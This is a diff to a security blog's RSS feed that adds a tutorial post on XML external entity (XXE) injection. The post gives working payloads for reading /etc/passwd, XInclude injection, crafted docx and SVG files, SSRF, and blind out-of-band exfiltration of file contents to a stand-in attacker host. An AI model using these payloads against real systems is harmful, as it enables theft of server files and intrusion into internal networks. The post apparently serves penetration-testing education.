@@ -6,8 +6,112 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Sun, 25 Apr 2021 00:00:00 +0000</lastBuildDate>
+        <lastBuildDate>Mon, 07 Jun 2021 00:00:00 +0000</lastBuildDate>
         <atom:link href="https://tranquac.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>XXE</title>
+            <link>https://tranquac.github.io/posts/2021/06/xxe/</link>
+            <pubDate>Mon, 07 Jun 2021 00:00:00 +0000</pubDate>
+            
+            <guid>https://tranquac.github.io/posts/2021/06/xxe/</guid>
+            <description>What is XXE Types of XXE attacks  XXE To retrieve files  Example XXE through the XInclude tag Exploiting XXE using SVG Files or docx files or xlsx files   XXE Into SSRF Blind XXE   Note References  What is XXE XXE = XML eXternal Entities
+XXE can occur when XML documents get parsed. We traditionally think of XXE vulnerabilities as uploading an XML file that includes an external entity, an example of this would be:</description>
+            <content type="html"><![CDATA[<ul>
+<li><a href="#what-is-xxe">What is XXE</a></li>
+<li><a href="#types-of-xxe-attacks">Types of XXE attacks</a>
+<ul>
+<li><a href="#xxe-to-retrieve-files">XXE To retrieve files</a>
+<ul>
+<li><a href="#example">Example</a></li>
+<li><a href="#xxe-through-the-xinclude-tag">XXE through the XInclude tag</a></li>
+<li><a href="#exploiting-xxe-using-svg-files-or-docx-files-or-xlsx-files">Exploiting XXE using SVG Files or docx files or xlsx files</a></li>
+</ul>
+</li>
+<li><a href="#xxe-into-ssrf">XXE Into SSRF</a></li>
+<li><a href="#blind-xxe">Blind XXE</a></li>
+</ul>
+</li>
+<li><a href="#note">Note</a></li>
+<li><a href="#references">References</a></li>
+</ul>
+<h2 id="what-is-xxe">What is XXE</h2>
+<p>XXE = XML eXternal Entities</p>
+<p>XXE can occur when XML documents get parsed. We traditionally think of XXE vulnerabilities as uploading an XML file that includes an external entity, an example of this would be:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34; &gt;</span>]&gt;
+<span style="color:#f92672">&lt;foo&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/foo&gt;</span>
+</code></pre></div><p>We might be able to upload this file if we save it as .xml into an application that process XML files but what some people don&rsquo;t know is that some other file types consist of XML files.</p>
+<h2 id="types-of-xxe-attacks">Types of XXE attacks</h2>
+<p>XXE can be abused to perform several types of attacks. It can even be chained into things like SSRF.</p>
+<ul>
+<li>XXE to retrieve files</li>
+<li>XXE to perform SSRF</li>
+<li>Blind XXE</li>
+</ul>
+<h3 id="xxe-to-retrieve-files">XXE To retrieve files</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span> ]&gt;
+<span style="color:#f92672">&lt;product&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/product&gt;</span>
+<span style="color:#f92672">&lt;adress&gt;</span>&amp;xxe;<span style="color:#f92672">&lt;/adress&gt;</span>
+</code></pre></div><p>In this example we first define the document type and in there we define a new Entity called &ldquo;XXE&rdquo;. This entity is made to execute a system call. This can be anything like ls, a reverse shell or in this case a file inclusion. It will grab the /etc/passwd file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span> ]&gt;
+</code></pre></div><p>Next we will display that entity xxe into every possible field of our XML file. It&rsquo;s very important to insert your XXE entity into every single XML element. Any of them can be vulnerable as the developer has to filter ALL the fields indivually.\</p>
+<h4 id="example">Example</h4>
+<p>Request
+<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/retrieve_file_1.PNG" alt="retrieve_file_1.PNG">
+<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/retrieve_file_2.PNG" alt="retrieve_file_2.PNG">
+From here, we can modify the XML data to add in an XXE to request the file we wish to target.
+<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/retrieve_file_3.PNG" alt="retrieve_file_3.PNG">
+Response
+<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/retrieve_file_4.PNG" alt="retrieve_file_4.PNG"></p>
+<h4 id="xxe-through-the-xinclude-tag">XXE through the XInclude tag</h4>
+<p>Often, an attacker does not have full control over the XML data, but has control over an input passed into the data. In these cases, they can’t inject an entity before the XML parameters, which makes it appear impossible to conduct XXE attacks. Often however, it is possible to do a XXE attack with just access to a single parameter, using the XInclude feature of XML.<br>
+XInclude can be thought of as a way of including another XML document within an existing one. Using this feature, we can include a XML component that defines our external entity, and use that to leak data from the server. In this situation, the data sent from the client includes only the parameters required to add to the XML.
+<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/xinclude1.PNG" alt="xinclude1.PNG">
+To setup the XInclude, we need to inject data into the product ID parameter. The payload will look like below.
+<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/xinclude2.PNG" alt="xinclude2.PNG">
+Without all of the encoding, the payload is:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;foo</span> <span style="color:#a6e22e">xmlns:xi=</span><span style="color:#e6db74">&#34;http://www.w3.org/2001/XInclude&#34;</span><span style="color:#f92672">&gt;&lt;xi:include</span> <span style="color:#a6e22e">parse=</span><span style="color:#e6db74">&#34;text&#34;</span> <span style="color:#a6e22e">href=</span><span style="color:#e6db74">&#34;file:///etc/passwd&#34;</span><span style="color:#f92672">/&gt;&lt;/foo&gt;</span>
+</code></pre></div><h4 id="exploiting-xxe-using-svg-files-or-docx-files-or-xlsx-files">Exploiting XXE using SVG Files or docx files or xlsx files</h4>
+<p>Gen docx file with python
+<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/docx1.PNG" alt="docx1.PNG">
+A Docx file is mostly just zipped up xml files. We need to unzip the resume.docx file and modify the contents in “word/document.xml”. Then, save our changes back to resume.docx.
+<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/docx2.PNG" alt="docx2.PNG">
+Two modifications are needed in document.xml.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE test [&lt;!ENTITY test SYSTEM &#39;file:///etc/passwd&#39;&gt;</span>]&gt;
+</code></pre></div><p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/docx4.PNG" alt="docx4.PNG">
+You can do the same with xlsx and svg
+<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/xxe/svg.PNG" alt="svg.PNG"></p>
+<h3 id="xxe-into-ssrf">XXE Into SSRF</h3>
+<p>A SSRF attack allows an attacker to perform server-side request forgery. This basically means that the attacker can make HTTP requests to any URL the server can access. This means that they can access URLs that they typically don’t have permission to access, which could potentially leak data.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM
+</span><span style="color:#75715e">&#34;http://intranet.cheeseshop.com&#34;&gt;</span> ]&gt;
+</code></pre></div><h3 id="blind-xxe">Blind XXE</h3>
+<p>The majority of XXE vulnerabilities in the wild will be blind XXE attacks. To detect these we can use an out of band webserver that we host ourselves and make the target do a callback to our server using the same technique we used previously in XXE into SSRF.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &#34;http://f2g9j7hhkax.web-attacker.com&#34;&gt;</span>
+]&gt;
+</code></pre></div><p>If we detect blind XXE, we can exfiltrate data via OAST</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+<span style="color:#75715e">&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM &#39;http://webattacker.com/?x=%file;&#39;&gt;</span>&#34;&gt;
+%eval;
+%exfiltrate;
+</code></pre></div><p>Our first entity will grab the data file /etc/passwd and our second entity will make a callback to our server with the contents of the /etc/passwd file in a get parameter.</p>
+<h2 id="note">Note</h2>
+<p>Alway check file upload can inject xml</p>
+<ul>
+<li>profile pictures (.svg)</li>
+<li>banners (.svg)</li>
+<li>photo albums (.svg)</li>
+<li>XML imports (.xml)</li>
+<li>DOCX/XLSX imports (.docx/.xlsx)</li>
+<li>SOAP requests</li>
+<li>&hellip;</li>
+</ul>
+<h2 id="references">References</h2>
+<p>-<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection</a><br>
+-<a href="https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/">https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/</a></p>
+]]></content>
+        </item>
         
         <item>
             <title>OSCP CheatSheet</title>
